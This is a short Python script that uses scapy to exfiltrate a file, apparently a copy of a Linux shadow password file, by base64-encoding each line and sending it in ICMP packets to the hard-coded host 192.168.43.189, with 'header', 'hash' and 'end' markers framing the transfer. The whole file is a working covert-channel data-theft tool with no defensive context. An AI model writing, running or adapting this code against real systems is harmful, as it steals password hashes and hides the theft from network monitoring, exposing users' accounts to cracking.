from scapy import all as scapy
import base64

filepath = 'save_shaddow'

def send_shadow(filepath):
    with open(filepath) as fp:
        line = fp.readlines()
        test = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"test"
        scapy.send(test)
        head = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"header"
        scapy.send(head)
        for data in line:
            encoded = base64.b64encode(data.encode('ascii'))
            paquet = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"hash"/encoded
            scapy.send(paquet)
        end = scapy.IP(dst="192.168.43.189")/scapy.ICMP()/"end"
        scapy.send(end)

send_shadow(filepath)

